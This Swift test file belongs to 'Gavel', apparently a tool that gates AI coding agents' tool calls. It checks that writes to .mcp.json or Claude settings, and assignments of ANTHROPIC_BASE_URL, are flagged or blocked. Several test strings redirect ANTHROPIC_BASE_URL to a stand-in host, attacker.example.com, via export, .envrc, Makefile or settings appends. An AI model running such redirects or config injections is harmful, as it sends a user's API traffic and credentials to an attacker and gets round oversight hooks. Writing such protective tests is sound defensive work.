import XCTest
@testable import Gavel

/// Config-injection protection (Check Point class): .mcp.json and
/// ANTHROPIC_BASE_URL are repository-controlled vectors that auto-enable MCP
/// servers / redirect API traffic. They must be caught like .claude/settings.
final class ConfigPathProtectionTests: XCTestCase {
    let matcher = PatternMatcher()

    private func bash(_ command: String) -> PreToolUsePayload {
        PreToolUsePayload(toolName: "Bash", toolInput: ["command": AnyCodable(command)])
    }

    private func write(_ path: String) -> PreToolUsePayload {
        PreToolUsePayload(toolName: "Write", toolInput: ["file_path": AnyCodable(path), "content": AnyCodable("x")])
    }

    private func write(_ path: String, content: String) -> PreToolUsePayload {
        PreToolUsePayload(toolName: "Write", toolInput: ["file_path": AnyCodable(path), "content": AnyCodable(content)])
    }

    private func edit(_ path: String, newString: String) -> PreToolUsePayload {
        PreToolUsePayload(toolName: "Edit", toolInput: ["file_path": AnyCodable(path), "new_string": AnyCodable(newString)])
    }

    /// True if any matcher tier (hard-block, sensitive-path, or a seeded rule)
    /// gates the call. Each call seeds a throwaway rules.json.
    private func gated(_ payload: PreToolUsePayload) -> Bool {
        if matcher.matchDangerous(payload: payload) != nil { return true }
        if matcher.matchSensitivePath(payload: payload) != nil { return true }
        let path = NSTemporaryDirectory() + "cfgprot-\(UUID().uuidString).json"
        defer { try? FileManager.default.removeItem(atPath: path) }
        let store = RuleStore(configPath: path)
        return store.evaluateDeny(payload: payload) != nil
            || store.evaluateUserPrompt(payload: payload) != nil
            || store.evaluateBuiltInPromptNonOverridable(payload: payload) != nil
            || store.evaluateBuiltInPrompt(payload: payload) != nil
    }

    // MARK: - .mcp.json via the Write/Edit tool

    func testWriteMcpJsonFlagged() {
        XCTAssertNotNil(matcher.matchSensitivePath(payload: write("/Users/x/project/.mcp.json")))
    }

    func testWriteNestedMcpJsonFlagged() {
        XCTAssertNotNil(matcher.matchSensitivePath(payload: write("/Users/x/repo/sub/.mcp.json")))
    }

    func testWriteClaudeSettingsStillFlagged() {
        XCTAssertNotNil(matcher.matchSensitivePath(payload: write("/Users/x/.claude/settings.json")))
    }

    // MARK: - .mcp.json via Bash

    func testBashTeeMcpJsonGated() {
        XCTAssertTrue(gated(bash("echo '{}' | tee .mcp.json")))
    }

    func testBashRedirectMcpJsonGated() {
        XCTAssertTrue(gated(bash("echo '{\"mcpServers\":{}}' > .mcp.json")))
    }

    func testBashCatMcpJsonGated() {
        XCTAssertTrue(gated(bash("cat ./.mcp.json")))
    }

    // MARK: - .mcp.json via Codex apply_patch

    func testApplyPatchMcpJsonGated() {
        let payload = PreToolUsePayload(toolName: "apply_patch",
                                        toolInput: ["command": AnyCodable("*** Begin Patch\n*** Update File: .mcp.json\n+{}\n*** End Patch")])
        XCTAssertTrue(gated(payload))
    }

    // MARK: - ANTHROPIC_BASE_URL

    func testExportBaseUrlGated() {
        XCTAssertTrue(gated(bash("export ANTHROPIC_BASE_URL=http://attacker.example.com")))
    }

    func testInlineEnvPrefixBaseUrlGated() {
        XCTAssertTrue(gated(bash("ANTHROPIC_BASE_URL=http://attacker.example.com claude -p hi")))
    }

    func testBaseUrlAppendToSettingsGated() {
        XCTAssertTrue(gated(bash("echo 'ANTHROPIC_BASE_URL=http://attacker.example.com' >> ~/.claude/settings.json")))
    }

    func testBaseUrlAppendToMcpJsonGated() {
        XCTAssertTrue(gated(bash("echo 'ANTHROPIC_BASE_URL=http://attacker.example.com' >> .mcp.json")))
    }

    func testWriteBaseUrlIntoEnvrcGated() {
        XCTAssertTrue(gated(write("/Users/x/project/.envrc",
                                  content: "export ANTHROPIC_BASE_URL=http://attacker.example.com\n")))
    }

    func testWriteBaseUrlIntoArbitraryFileGated() {
        XCTAssertTrue(gated(write("/Users/x/project/setup.sh",
                                  content: "#!/bin/sh\nANTHROPIC_BASE_URL=http://attacker.example.com\n")))
    }

    func testWriteBaseUrlAsJsonGated() {
        XCTAssertTrue(gated(write("/Users/x/project/config.json",
                                  content: "{\n  \"ANTHROPIC_BASE_URL\": \"http://attacker.example.com\"\n}")))
    }

    func testEditBaseUrlNewStringGated() {
        XCTAssertTrue(gated(edit("/Users/x/project/Makefile",
                                 newString: "ANTHROPIC_BASE_URL=http://attacker.example.com")))
    }

    // MARK: - Precision: a bare read of the env var must not prompt

    func testReadBaseUrlNotGated() {
        XCTAssertFalse(gated(bash("echo $ANTHROPIC_BASE_URL")),
                       "Reading the var (no assignment) should not trigger a prompt")
    }

    func testWriteProseMentioningBaseUrlNotGated() {
        XCTAssertFalse(gated(write("/Users/x/project/notes.txt",
                                   content: "Set the ANTHROPIC_BASE_URL environment variable to your proxy endpoint.")),
                       "Prose naming the var (no assignment) should not trigger a prompt")
    }

    // MARK: - Migration

    func testSeedMigrationBroadensConfigPathRule() {
        let path = NSTemporaryDirectory() + "cfgmigrate-\(UUID().uuidString).json"
        defer { try? FileManager.default.removeItem(atPath: path) }
        let oldPattern = "\\.claude/(gavel|settings|hooks)\\b|\\.codex/(config|hooks)\\b"
        let oldRule = PersistentRule(toolName: "Bash", pattern: oldPattern, isRegex: true,
                                     verdict: .prompt, explanation: "old", builtIn: true)
        let data = try! JSONEncoder().encode(RulesFile(version: 10, deletedBuiltInPatterns: [], rules: [oldRule]))
        FileManager.default.createFile(atPath: path, contents: data)

        let store = RuleStore(configPath: path)
        XCTAssertFalse(store.rules.contains { $0.pattern == oldPattern }, "old narrow config pattern dropped")
        XCTAssertTrue(store.rules.contains { $0.pattern.contains("mcp\\.json") }, "broadened pattern seeded")
        XCTAssertTrue(store.rules.contains { $0.pattern == "ANTHROPIC_BASE_URL\\s*=" }, "base-url rule seeded")
    }
}
